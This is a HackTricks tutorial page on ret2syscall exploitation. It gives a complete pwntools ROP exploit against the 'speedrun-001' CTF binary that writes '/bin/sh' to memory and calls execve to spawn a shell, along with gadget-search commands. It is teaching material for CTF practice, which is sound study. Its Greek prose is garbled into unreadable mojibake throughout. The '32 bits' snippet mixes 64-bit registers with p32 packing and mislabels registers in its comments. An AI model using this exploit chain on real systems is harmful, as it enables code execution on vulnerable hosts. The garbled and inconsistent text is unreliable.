# Ret2syscall

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ Ret2lib, Ï‰ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î´ÎµÎ½ Î¸Î± ÎºÎ±Î»Î¿ÏÎ¼Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€ÏŒ Î¼Î¹Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, ÏŒÎ»Î± Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¼Î­Î½Î± Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ syscall `sys_execve` Î¼Îµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ®Î¼Î±Ï„Î± Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ `/bin/sh`. Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÎ¼Î­Î½Î±, Î¿Ï€ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï€Î¿Î»Î»Î¬ gadgets ÎºÎ±Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ syscall.

Î“Î¹Î± Î½Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Î³Î¹Î± Ï„Î¿ **syscall** Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î· ÎµÎ¾Î®Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·:

* `rax: 59 Specify sys_execve`
* `rdi: ptr to "/bin/sh" specify file to execute`
* `rsi: 0 specify no arguments passed`
* `rdx: 0 specify no environment variables passed`

ÎˆÏ„ÏƒÎ¹, Î²Î±ÏƒÎ¹ÎºÎ¬ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Ï„Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ `/bin/sh` ÎºÎ¬Ï€Î¿Ï… ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ `syscall` (ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± ÎµÎ¯Î¼Î±ÏƒÏ„Îµ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¿Î¯ Î¼Îµ Ï„Î¿ padding Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚). Î“Î¹Î± Î±Ï…Ï„ÏŒ, Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Î­Î½Î± gadget Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Ï„Î¿ `/bin/sh` ÏƒÎµ Î¼Î¹Î± Î³Î½Ï‰ÏƒÏ„Î® Ï€ÎµÏÎ¹Î¿Ï‡Î®.

{% hint style="success" %}
ÎœÎ¹Î± Î¬Î»Î»Î· ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± syscall Î³Î¹Î± ÎºÎ»Î®ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î· **`mprotect`** Ï€Î¿Ï… Î¸Î± ÎµÏ€Î­Ï„ÏÎµÏ€Îµ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Î¹Î±Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·**. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´Ï…Î±ÏƒÏ„ÎµÎ¯ Î¼Îµ [**ret2shellcode**](../../stack-overflow/stack-shellcode/).
{% endhint %}

## Register gadgets

Î‘Ï‚ Î¾ÎµÎºÎ¹Î½Î®ÏƒÎ¿Ï…Î¼Îµ Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Ï‚ **Ï€ÏÏ‚ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚**:
```bash
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÎºÎ±Î¹ Î½Î± Ï„Î¿ Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ ÏƒÏ„Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚**.

## Î“ÏÎ¬ÏˆÏ„Îµ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬

### Î“ÏÎ±Ï†Î¹ÎºÎ® Î¼Î½Î®Î¼Î·

Î ÏÏÏ„Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Î³ÏÎ¬ÏˆÎ¹Î¼Î¿ Î¼Î­ÏÎ¿Ï‚ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Î“ÏÎ¬ÏˆÏ„Îµ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·

Î¤ÏŒÏ„Îµ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Î»Ï…ÏƒÎ¯Î´Î±Ï‚ ROP

Î— Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î® Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î¼Î¹Î± Ï€Î»Î®ÏÎ· Î±Î»Ï…ÏƒÎ¯Î´Î± ROP `sys_execve` Î´ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… ÎµÎ½ÏŒÏ‚ ÏƒÏ„Î±Ï„Î¹ÎºÎ¿Ï Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏŒÏ„Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ gadgets write-what-where ÎºÎ±Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ syscall:
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 bits
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bits
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Lacking Gadgets

Î‘Î½ **Î»ÎµÎ¯Ï€Î¿Ï…Î½ gadgets**, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ `/bin/sh` ÏƒÏ„Î· Î¼Î½Î®Î¼Î·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ **Ï„ÎµÏ‡Î½Î¹ÎºÎ® SROP Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï„Î¹Î¼Î­Ï‚ Ï„Ï‰Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„ÏÎ½** (ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„Ï‰Î½ RIP ÎºÎ±Î¹ Ï„Ï‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„ÏÎ½) Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î±:

{% content-ref url="../srop-sigreturn-oriented-programming/" %}
[srop-sigreturn-oriented-programming](../srop-sigreturn-oriented-programming/)
{% endcontent-ref %}

## Exploit Example
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Î†Î»Î»Î± Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± & Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)
* 64 bits, no PIE, nx, Î³ÏÎ¬ÏˆÏ„Îµ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î½Î®Î¼Î· Î­Î½Î± ROP Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `execve` ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯.
* [https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html)
* 64 bits, nx, no PIE, Î³ÏÎ¬ÏˆÏ„Îµ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î½Î®Î¼Î· Î­Î½Î± ROP Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `execve` ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯. Î“Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏƒÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î¼Î±Î¸Î·Î¼Î±Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¬Î¾ÎµÎ¹Ï‚.
* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, Î³ÏÎ¬ÏˆÏ„Îµ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î½Î®Î¼Î· Î­Î½Î± ROP Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `execve` ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
